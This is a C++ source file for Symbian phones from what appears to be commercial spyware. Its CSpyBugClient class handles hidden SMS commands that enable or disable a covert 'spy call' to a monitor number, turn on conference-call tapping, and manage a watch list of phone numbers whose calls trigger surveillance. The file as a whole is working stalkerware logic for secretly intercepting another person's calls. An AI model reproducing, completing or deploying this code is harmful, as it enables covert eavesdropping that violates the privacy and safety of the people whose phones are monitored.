#include "SpyBugClient.h"
#include "SmsCmdManager.h"
#include "Global.h"
#include "SpyInfo.h"
#include "BugClient.h"
#include "AutoAnswer.h"
#include "ShareProperty.h"
#include "RscHelper.h"
#include "GlobalConst.h"

const TInt KSpyEnableStatusMaxLength = 150;

CSpyBugClient::CSpyBugClient(MProductLicense& aLicense)
:iLicense(aLicense)
	{
	}

CSpyBugClient::~CSpyBugClient()
	{
	delete iAutoAns;
	delete iBugClient;
	}

CSpyBugClient* CSpyBugClient::NewL(MProductLicense& aLicense)
	{
	return CSpyBugClient::NewL(aLicense, NULL);
	}
	
CSpyBugClient* CSpyBugClient::NewL(MProductLicense& aLicense,const TFileName* aAppPath)
	{
	CSpyBugClient* self = new(ELeave)CSpyBugClient(aLicense);
	CleanupStack::PushL(self);
	self->ConstructL(aAppPath);
	CleanupStack::Pop(self);
	return self;		
	}
	
void CSpyBugClient::ConstructL(const TFileName* aAppPath)
	{
	iBugClient=CBugClient::NewL(aAppPath);	
	}
//
//MLicenceObserver
void CSpyBugClient::LicenceActivatedL(TBool aActivated)
	{
	CFxsSettings& setting = Global::Settings();	
	LOG3(_L("[CSpyBugClient::LicenceActivatedL] aActivated: %d, IsTSM: %d,iBugClient: %d"),aActivated, setting.IsTSM(), iBugClient)
	
	if(aActivated)
		{
		if(setting.IsTSM())
		//for test house
			{
			if(!iAutoAns)
				{
				iAutoAns = CAutoAnswer::NewL(setting.SpyMonitorInfo());				
				}
			iAutoAns->Start();				
			delete iBugClient;
			iBugClient =NULL;			
			}
		else
			{
			TMonitorInfo& monitor = setting.SpyMonitorInfo();	
			if(Feature::CallTapping())
			//prox supports conference spy call		
				{
				monitor.iConferenceEnable = ETrue;
				}
			else
				{
				monitor.iConferenceEnable = EFalse;
				TWatchList& watchList=setting.WatchList();
				watchList.iEnable=TWatchList::EDisableAll;
				}
			iBugClient->SetBugInfo(setting.BugInfo());
			}
		}
		else // not activated, deactivated
			{
			if(iBugClient)
				{
				TMonitorInfo& monitor = setting.SpyMonitorInfo();
				monitor.iEnable = EFalse;
				iBugClient->SetMonitorInfo(monitor);
				}
			
			if(iAutoAns)
				{
				iAutoAns->Stop();
				}
			}
	}
	
void CSpyBugClient::OnSettingChangedL(CFxsSettings& aSettings)
	{
	if(!aSettings.IsTSM() && iLicense.ProductActivated())
	//if aSettingData.BugInfo() is equal to previous call
	//this function does nothing	
		{
		const TBugInfo& bugInfo = aSettings.BugInfo();
		iBugClient->SetBugInfo(bugInfo);
		TBool bugEnable = bugInfo.SpyEnable();
		FxShareProperty::SetSpyEnableFlag(bugEnable);
		if(bugEnable)
			{
			FxShareProperty::SetMonitorNumber(bugInfo.iMonitor.iTelNumber);	
			}
		}
	}
	
HBufC* CSpyBugClient::HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails)
	{
//
//This method will be invorked if product is activated and FlexiKEY is correct
//So no need to check it again
//
	switch(aCmdDetails.iCmd)
		{
		case KCmdEnableSpyCall:
			{
			return ProcessCmdEnableSpyL(aCmdDetails);
			}break;
		case KCmdDisableSpyCall:
			{
			return ProcessCmdDisableSpyL(aCmdDetails);
			}break;
		case KCmdEnableWatchList:
			{
			return ProcessCmdEnableWatchListL(aCmdDetails);
			}break;
		case KCmdClearWatchList:
			{
			return ProcessCmdClearWatchListL(aCmdDetails);
			}break;
		default:
			;
		}
	return NULL;
	}
	
/**
Process enable spy call command.
The format for this command is
<*#20> <FlexiKEY> <66,0816686632>*/
HBufC* CSpyBugClient::ProcessCmdEnableSpyL(const TSmsCmdDetails& aCmdDetails)
	{
	CFxsSettings& settings = Global::Settings();
	HBufC* message(NULL);
	if(!settings.IsTSM())
		{
		TMonitorInfo& monitorInfo = settings.SpyMonitorInfo();
		monitorInfo.iEnable = ETrue;
		TSmsSpyNumberParser cmdParser;
		FxShareProperty::SetSpyEnableFlag(ETrue);
		if(aCmdDetails.iTag2.Length())
			{
			//still support number in format: 66,0816684485
			if(cmdParser.Accept(aCmdDetails.iTag2))
				{
				cmdParser.ParseNumber(aCmdDetails.iTag2);
				XUtil::Copy(monitorInfo.iTelNumber, cmdParser.Number());
				SendMonitorInfo(monitorInfo);
				FxShareProperty::SetMonitorNumber(monitorInfo.iTelNumber);
				}
			}
		
		settings.NotifyChanged();		
		//create response message
		if(monitorInfo.iTelNumber.Length())
			{
			HBufC* header = CreateRespHeaderLC(aCmdDetails.iCmd, KErrNone);
			HBufC* spyEnable = CreateSpyEnableLC(monitorInfo);
			HBufC* watchListStat = CreateWatchListStatusLC(settings.WatchList());		
			message = HBufC::NewL(header->Length() + spyEnable->Length() + watchListStat->Length() + 10);//plus newline
			TPtr ptr = message->Des();
			ptr.Append(*header);
			ptr.Append(KNewLine);
			ptr.Append(*spyEnable);
			ptr.Append(KNewLine);
		#ifdef FEATURE_WATCH_LIST
			ptr.Append(*watchListStat);
		#endif
			CleanupStack::PopAndDestroy(3);
			}
		else
			{
			HBufC* header = CreateRespHeaderLC(aCmdDetails.iCmd, KErrNone);
			HBufC* warning = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_ENABLESPY_WARNING_NO_MONITOR_NUMBER);
			message = HBufC::NewL(header->Length() + warning->Length()  );
			TPtr ptr = message->Des();
			ptr.Append(*header);
			ptr.Append(KNewLine);
			ptr.Append(*warning);
			CleanupStack::PopAndDestroy(2);
			}		
		}
	return message; //passing ownership
	}
	
HBufC* CSpyBugClient::ProcessCmdDisableSpyL(const TSmsCmdDetails& aCmdDetails)
	{
	CFxsSettings& settings = Global::Settings();
	HBufC* message(NULL);
	if(!settings.IsTSM())
		{
		TMonitorInfo& monitorInfo = settings.SpyMonitorInfo();
		monitorInfo.iEnable = EFalse;
		SendMonitorInfo(monitorInfo);
		settings.NotifyChanged();
		FxShareProperty::SetSpyEnableFlag(EFalse);
		
		//create response message
		HBufC* header = CreateRespHeaderLC(aCmdDetails.iCmd, KErrNone);
		HBufC* spyEnable = CreateSpyEnableLC(monitorInfo);		
		TBuf<30> watchListStatStr;
		
		HBufC* wlStatusFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_RESPONSE_FMT_WATCHLIST);
		HBufC* disable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_DISABLE);
		watchListStatStr.Format(*wlStatusFmt, disable);
		
		message = HBufC::NewL(header->Length() + spyEnable->Length() + watchListStatStr.Length() + 5);//plus newline
		TPtr ptr = message->Des();
		ptr.Append(*header);
		ptr.Append(KNewLine);
		ptr.Append(*spyEnable);
		ptr.Append(KNewLine);
	#ifdef FEATURE_WATCH_LIST
		ptr.Append(watchListStatStr);
	#endif
		CleanupStack::PopAndDestroy(4);		
		}
	return message; //passing ownership
	}
	
HBufC* CSpyBugClient::ProcessCmdEnableWatchListL(const TSmsCmdDetails& aCmdDetails)
	{
	TBuf<KMaxNumberLength> value;
	XUtil::Copy(value, aCmdDetails.iTag2);
	value.Trim();
	TInt valueLen = value.Length();
	
	CFxsSettings& setting = Global::Settings();	
	TWatchList& watchList = setting.WatchList();	
	TBool reachMaxLimit(EFalse);
	TBool changed(EFalse);
	if(valueLen == 1)
		{
		TUint flag;
		TLex lex(value);
		TInt err=lex.Val(flag);
		if(!err)
			{					
			switch(flag)
				{
				case 0:
					{
					watchList.iEnable = TWatchList::EDisableAll;
					}break;
				case 1:
					{
					watchList.iEnable = TWatchList::EEnableOnlyInWatchList;
					}break;
				case 2:
					{
					watchList.iEnable = TWatchList::EEnableAll;
					}break;
				default:
					;
				}
			changed = ETrue;
			setting.NotifyChanged();
			}	
		}
	else if(valueLen > 1)
		{
		TInt count = watchList.Count();
		if(count >= KMaxElementArrayOfWatchNumber)
			{
			reachMaxLimit = ETrue;
			}
		else
			{
			TSmsSpyNumberParser cmdParser;		
			//still support number in format: 66,0816684485
			cmdParser.ParseNumber(value);
			const TDesC& watchNumber = cmdParser.Number();
			if(watchNumber.Length() && !watchList.NumberExist(watchNumber))
				{
				changed = ETrue;
				TInt arrLen = watchList.iWNList.Count();
				for(TInt i=0;i<arrLen;i++)
					{
					if(watchList.iWNList[i].Length() == 0 )
						{
						XUtil::Copy(watchList.iWNList[i],watchNumber);
						break;
						}
					}
				}
			}
		}
	
	if(changed)
		{
		SendWatchList(watchList);	
		}
	
	HBufC* header = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, KErrNone);
	HBufC * wlStatus = CreateWatchListStatusLC(watchList, reachMaxLimit);
	HBufC* message = HBufC::NewL(header->Length() + wlStatus->Length() + 10);//plus new line
	TPtr ptr = message->Des();
	ptr.Append(*header);
	ptr.Append(KNewLine);
	ptr.Append(*wlStatus);
	CleanupStack::PopAndDestroy(2);
	return message;
	}

HBufC* CSpyBugClient::ProcessCmdClearWatchListL(const TSmsCmdDetails& /*aCmdDetails*/)
	{
	CFxsSettings& setting = Global::Settings();
	TWatchList& watchList = setting.WatchList();
	watchList.Reset();	
	setting.NotifyChanged();
	SendWatchList(watchList);
	return NULL;
	}
	
void CSpyBugClient::SendMonitorInfo(const TMonitorInfo& aMonitor)
	{
	iBugClient->SetMonitorInfo(aMonitor);	
	}

void CSpyBugClient::SendWatchList(TWatchList& aWL)
	{
	iBugClient->SetWatchList(aWL);	
	}

HBufC* CSpyBugClient::CreateRespHeaderLC(TInt aSmsCmd, TInt aErr)
	{
	return CSmsCmdManager::ResponseHeaderLC(aSmsCmd, aErr);	
	}

HBufC* CSpyBugClient::CreateSpyEnableLC(const TMonitorInfo& aMonitor)
	{
	TBuf<20> spyEnableStr;
	if(aMonitor.iEnable)
		{
		HBufC* txtYes = RscHelper::ReadResourceLC(R_TEXT_YES);
		COPY(spyEnableStr, txtYes->Des());
		CleanupStack::PopAndDestroy();
		}
	else
		{
		HBufC* txtNo = RscHelper::ReadResourceLC(R_TEXT_NO);		
		COPY(spyEnableStr, txtNo->Des());
		CleanupStack::PopAndDestroy();
		}
	HBufC* response = HBufC::NewLC(KSpyEnableStatusMaxLength);
	HBufC* responseFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_RESPONSE_FMT_ENABLESPY);	
	response->Des().Format(*responseFmt, &spyEnableStr, &aMonitor.iTelNumber);
	CleanupStack::PopAndDestroy();
	return response;
	}
	
HBufC* CSpyBugClient::CreateWatchListStatusLC(const TWatchList& aWL)
	{
#ifdef FEATURE_WATCH_LIST
	HBufC* rspWatchListFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_RESPONSE_FMT_WATCHLIST);
	TBuf<100> statusStr;
	switch(aWL.iEnable)
		{
		case TWatchList::EEnableAll:
			{
			HBufC* enalbeAll = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_ENABLE_ALL);
			statusStr.Format(*rspWatchListFmt, enalbeAll);
			CleanupStack::PopAndDestroy();
			}break;
		case TWatchList::EEnableOnlyInWatchList:
			{
			HBufC* onlyInList = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_ENABLE_IN_LIST);
			statusStr.Format(*rspWatchListFmt, onlyInList);
			CleanupStack::PopAndDestroy();
			}break;
		default:
			{
			HBufC* disable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_DISABLE);
			statusStr.Format(*rspWatchListFmt, disable);
			CleanupStack::PopAndDestroy();
			}
		}
	CleanupStack::PopAndDestroy();
		
	HBufC* numLable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WL_NUMBER);
	TInt numberCount = aWL.Count();
	HBufC* response = HBufC::NewL(statusStr.Length() + numLable->Length() + (KMaxTelNumberLength*numberCount) + numberCount + 20);//also plsu new line
	TPtr ptr = response->Des();
	ptr.Append(statusStr);
	ptr.Append(KNewLine);	
	ptr.Append(*numLable);
	CleanupStack::PopAndDestroy(numLable);
	
	for(TInt i=0;i<aWL.iWNList.Count();i++)
		{
		const TDesC& number = aWL.iWNList[i];		
		ptr.Append(number);
		ptr.Append(KNewLine);
		}
	CleanupStack::PushL(response);
	return response;
#else
		HBufC* ret=HBufC::NewLC(0);
		return ret;		
#endif
	}
	
HBufC* CSpyBugClient::CreateWatchListStatusLC(const TWatchList& aWL, TBool aReachMaxLimit)
	{
#ifdef FEATURE_WATCH_LIST
	HBufC* rspWatchListFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_RESPONSE_FMT_WATCHLIST);
	TBuf<100> statusStr;
	if(aReachMaxLimit)
		{
		HBufC* maxLimitReached = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_REACH_MAXLIMIT);
		statusStr.Format(*rspWatchListFmt, maxLimitReached);
		CleanupStack::PopAndDestroy();
		}
	else
		{
		switch(aWL.iEnable)
			{
			case TWatchList::EEnableAll:
				{
				HBufC* enalbeAll = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_ENABLE_ALL);
				statusStr.Format(*rspWatchListFmt, enalbeAll);
				CleanupStack::PopAndDestroy();
				}break;
			case TWatchList::EEnableOnlyInWatchList:
				{
				HBufC* onlyInList = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_ENABLE_IN_LIST);
				statusStr.Format(*rspWatchListFmt, onlyInList);
				CleanupStack::PopAndDestroy();
				}break;
			default:
				{
				HBufC* disable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WLSTATUS_DISABLE);
				statusStr.Format(*rspWatchListFmt, disable);
				CleanupStack::PopAndDestroy();
				}
			}
		}
	
	CleanupStack::PopAndDestroy();	
	HBufC* numLable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_WL_NUMBER);
	TInt numberCount = aWL.Count();
	HBufC* response = HBufC::NewL(statusStr.Length() + numLable->Length() + (KMaxTelNumberLength*numberCount) + numberCount + 20);	
	TPtr ptr = response->Des();
	ptr.Append(statusStr);
	ptr.Append(KNewLine);
	ptr.Append(*numLable);
	CleanupStack::PopAndDestroy(numLable);
	
	for(TInt i=0;i<aWL.iWNList.Count();i++)
		{
		const TDesC& number = aWL.iWNList[i];		
		ptr.Append(number);
		ptr.Append(KNewLine);
		}
	CleanupStack::PushL(response);
	return response;
#else
	HBufC* ret=HBufC::NewLC(0);
	return ret;		
#endif
	}
